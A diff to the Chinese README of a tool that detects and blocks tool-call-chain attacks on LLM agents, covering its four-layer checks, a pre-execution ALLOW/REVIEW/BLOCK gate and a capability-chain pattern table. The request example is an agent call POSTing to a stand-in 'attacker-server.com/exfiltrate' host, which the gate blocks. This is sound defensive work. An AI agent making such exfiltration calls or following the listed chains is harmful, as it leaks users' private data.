@@ -4,20 +4,26 @@
 
 ## 项目简介
 
-本项目实现了一个实时检测系统，用于检测和阻止 LLM Agent 的工具调用链攻击。系统采用**四层检测架构**：
+本项目实现了一个工具调用链攻击检测与阻断系统，面向 LLM Agent 的工具调用链攻击。系统采用**四层检测架构**：
 
 1. **权限检查** - 黑名单工具直接阻断
 2. **注入检测 + 参数定级** - 检测注入攻击，评估参数危险度，标注能力
 3. **能力链匹配** - 基于能力序列检测危险链（替代传统的工具名匹配）
 4. **频率检查** - 按工具风险等级差异化阈值
 
+系统提供两种使用方式：
+
+- **事后批量检测**：对一段工具调用会话执行四层检测，生成风险报告（SAFE / SUSPICIOUS / MALICIOUS）
+- **执行前判决**：Agent 每次请求工具时先通过闸口，返回 ALLOW / REVIEW / BLOCK，在攻击链的最后一步真正阻断调用（详见「执行前判决」章节）
+
 ## 项目结构
 
 ```
 tool_chain_attack_detection/
 ├── src/
+│   ├── guard.py                     # 执行前闸口 AgentGuard（evaluate / safe_execute）
 │   ├── core/                        # 核心检测引擎
-│   │   ├── detector.py              # 实时检测器（主入口）
+│   │   ├── detector.py              # 检测器（on_tool_call 事后告警 + evaluate 执行前判决）
 │   │   ├── chain_matcher.py         # 能力链匹配算法
 │   │   ├── permission_checker.py    # 权限策略检查（黑名单）
 │   │   ├── injection_checker.py     # 注入检测 + 参数定级 + 能力标注
@@ -26,19 +32,25 @@ tool_chain_attack_detection/
 │   ├── models/                      # 数据模型
 │   │   ├── input.py                 # 输入格式
 │   │   ├── alert.py                 # 告警模型
+│   │   ├── decision.py              # 执行前判决模型 PolicyDecision
 │   │   └── report.py                # 报告模型（生成 Markdown）
 │   └── rules/                       # 规则配置
 │       ├── permission_policy.yaml   # 权限策略（黑名单 + 工具风险等级）
 │       ├── param_grading.yaml       # 参数定级配置（25 个工具）
-│       ├── capability_chain_patterns.yaml  # 能力链模式（11 个功能链）
+│       ├── capability_chain_patterns.yaml  # 能力链模式（14 个功能链）
 │       ├── injection_patterns.py    # 注入检测正则 + 能力标注
 │       └── tool_classifier.py       # 工具分类器（兜底）
 ├── examples/                        # 示例数据
-│   ├── dangerous_chains/            # 危险链测试
+│   ├── dangerous_chains/            # 危险链测试（56 个样本）
+│   ├── guard_demo.py                # 前置阻断演示（放行 / 挂起 / 阻断）
 │   ├── injection_tests/             # 注入检测测试
 │   ├── frequency_tests/             # 频率检测测试
 │   ├── real_world_scenarios/        # 真实业务场景（5 个）
 │   └── ...
+├── tests/                           # pytest 测试（147 个用例）
+├── web/                             # Web 可视化（FastAPI + React）
+│   ├── backend/                     # 后端：检测 / 判决 / 报告 / 演示数据 API
+│   └── frontend/                    # 前端：仪表盘 / 在线检测 / 实时拦截 / 报告
 ├── reports/                         # 生成的报告
 ├── main.py                          # 主程序入口
 ├── run_mvp.py                       # MVP 演示程序
@@ -249,6 +261,72 @@ frequency_limits:
 危险链范围: 第 1 步 → 第 2 步
 ```
 
+## 执行前判决（真阻断）
+
+批量报告模式只能事后告警。为在工具真正执行前拦截，系统提供一条独立的判决路径：
+
+```
+Agent 请求工具 → evaluate() → ALLOW / REVIEW / BLOCK → 执行 / 挂起审批 / 丢弃
+```
+
+- `RealTimeDetector.evaluate(tool_call) -> PolicyDecision`（`src/core/detector.py`）
+- `AgentGuard.evaluate(...)` / `AgentGuard.safe_execute(..., executor)`（`src/guard.py`）：BLOCK 和 REVIEW 不会调用 executor
+- HTTP 接口：`POST /api/guard/evaluate`
+- Web 页面：`/guard`（实时拦截）
+
+### 判决规则（混合方案）
+
+| 判决 | 触发条件 |
+| --- | --- |
+| **BLOCK** | 黑名单工具；任一 critical 级告警（注入 / critical 能力链）；会话已失守且当前工具为 critical |
+| **REVIEW** | high 级告警；工具风险 ≥ high 且参数风险 ≥ high（单步高危操作） |
+| **ALLOW + 留痕** | medium 级告警，或工具风险 ≥ medium（`log_required = true`） |
+| **ALLOW** | 其余情况 |
+
+补充规则：
+
+- 被拦截的调用同样写入会话历史（留痕，不回收）
+- 命中 BLOCK 后会话标记为**失守**，之后 critical 工具一律拦截；会话之间相互隔离
+- 能力链匹配但相关参数全为低危时跳过，避免误拦正常业务
+- REVIEW 仅返回 `approval_required: true` 标记，审批界面不在本系统范围内
+
+### 请求示例
+
+```json
+POST /api/guard/evaluate
+{
+  "session_id": "s1",
+  "agent_name": "customer_support_agent",
+  "tool_name": "http_request",
+  "arguments": {"url": "https://attacker-server.com/exfiltrate", "method": "POST"},
+  "timestamp": "2026-10-23T10:30:10Z"
+}
+```
+
+### 响应示例
+
+```json
+{
+  "session_id": "s1",
+  "tool_name": "http_request",
+  "action": "BLOCK",
+  "reason": "命中 critical 级告警（能力链），能力链 private_data_exfiltration",
+  "risk_level": "critical",
+  "risk_score": 95.0,
+  "alert_types": ["CAPABILITY_CHAIN"],
+  "matched_chain": "private_data_exfiltration",
+  "log_required": true,
+  "approval_required": false,
+  "session_compromised": true
+}
+```
+
+演示脚本（3 个场景：数据外泄链、单步高危、黑名单工具）：
+
+```bash
+python examples/guard_demo.py
+```
+
 ## 快速开始
 
 ### 1. 安装依赖
@@ -280,7 +358,40 @@ MVP 程序会运行 12 个测试场景：
 
 报告输出到 `reports/mvp/` 目录。
 
-### 4. 查看报告
+### 4. 前置阻断演示
+
+```bash
+python examples/guard_demo.py
+```
+
+模拟 Agent 逐步调用工具并通过执行前闸口，打印每次判决（✅ 放行 / ⏸ 挂起待审批 / ⛔ 阻断）及被拦截的步骤。
+
+### 5. 运行测试
+
+```bash
+pip install pytest
+python -m pytest tests/ -q
+```
+
+共 147 个用例，覆盖四层检测、执行前判决、会话失守、能力链匹配等。
+
+### 6. 启动 Web 界面
+
+```bash
+# 后端（端口 8000）
+cd web/backend
+pip install -r requirements.txt
+python run.py
+
+# 前端（另开终端，端口 5173，/api 代理到后端）
+cd web/frontend
+npm install
+npm run dev
+```
+
+浏览器打开 http://localhost:5173 。
+
+### 7. 查看报告
 
 打开生成的 Markdown 报告，查看：
 
@@ -289,9 +400,36 @@ MVP 程序会运行 12 个测试场景：
 - 工具调用链
 - 统计分析
 
+## Web 可视化界面
+
+前后端分离（FastAPI + React/Vite），深色主题。
+
+### 页面
+
+| 路由 | 页面 | 功能 |
+| --- | --- | --- |
+| `/` | 仪表盘 | 报告总数、告警统计、判定分布、最近报告 |
+| `/detect` | 在线检测 | 提交工具调用序列，执行四层检测并生成报告 |
+| `/guard` | 实时拦截 | 逐个工具调用过闸口（自动回放 / 单步执行），展示 ALLOW / REVIEW / BLOCK、命中链与会话失守状态 |
+| `/reports` | 报告列表 | 历史报告管理（查看 / 删除） |
+| `/reports/:id` | 报告详情 | 告警详情、工具调用链、Markdown 报告下载 |
+
+### 接口
+
+| 方法 | 路径 | 说明 |
+| --- | --- | --- |
+| POST | `/api/detect/session` | 批量检测一个会话并生成报告 |
+| POST | `/api/guard/evaluate` | 单次工具调用的执行前判决 |
+| GET | `/api/reports` | 报告列表 |
+| GET | `/api/reports/{id}` | 报告详情 |
+| GET | `/api/reports/{id}/markdown` | 下载 Markdown 报告 |
+| DELETE | `/api/reports/{id}` | 删除报告 |
+| GET | `/api/examples` | 演示数据分类列表 |
+| GET | `/api/examples/content` | 读取指定演示数据 |
+
 ## 能力链模式库
 
-项目包含 11 个功能链，覆盖原有 56 个危险链模式中的 38 个可达模式：
+项目包含 14 个功能链（FC-1 ~ FC-14，编号连续）。对 56 个危险链样本的实测覆盖：20 个含黑名单工具在权限层直接阻断，36 个可达样本中 24 个命中功能链告警、3 个因参数全低危被跳过（预期行为）、9 个因样本参数问题未命中：
 
 | 功能链 | 能力序列                                           | 覆盖场景     |
 | ------ | -------------------------------------------------- | ------------ |
@@ -302,9 +440,13 @@ MVP 程序会运行 12 个测试场景：
 | FC-5   | EXTERNAL_INGESTION → PRIVATE_ACCESS               | 外部数据注入 |
 | FC-6   | PRIVATE_ACCESS → LOCAL_MUTATION                   | 读取后变更   |
 | FC-7   | LOCAL_MUTATION → PRIVATE_ACCESS                   | 变更后读取   |
-| FC-9   | EXTERNAL_INGESTION → 多能力                       | 外部到多能力 |
-| FC-10  | PRIVATE_ACCESS + LOCAL_MUTATION + PRIVILEGE_CHANGE | 提权         |
-| FC-11  | LOCAL_MUTATION + EXTERNAL_ACTION → 多能力         | Git 到多能力 |
+| FC-8   | EXTERNAL_INGESTION → EXTERNAL_ACTION              | 外部内容外传 |
+| FC-9   | EXTERNAL_ACTION → LOCAL_MUTATION                  | 外部动作到本地变更 |
+| FC-10  | EXTERNAL_ACTION → PRIVATE_ACCESS                  | 外联后回读   |
+| FC-11  | EXTERNAL_INGESTION → 多能力                       | 外部到多能力 |
+| FC-12  | PRIVATE_ACCESS + LOCAL_MUTATION + PRIVILEGE_CHANGE | 敏感路径提权 |
+| FC-13  | LOCAL_MUTATION + EXTERNAL_ACTION → 多能力         | Git 到多能力 |
+| FC-14  | PRIVATE_ACCESS → PRIVILEGE_CHANGE                 | 读取后提权   |
 
 完整配置见：[capability_chain_patterns.yaml](file:///d:/desktop/tool_chain_attack_detection/src/rules/capability_chain_patterns.yaml)
 
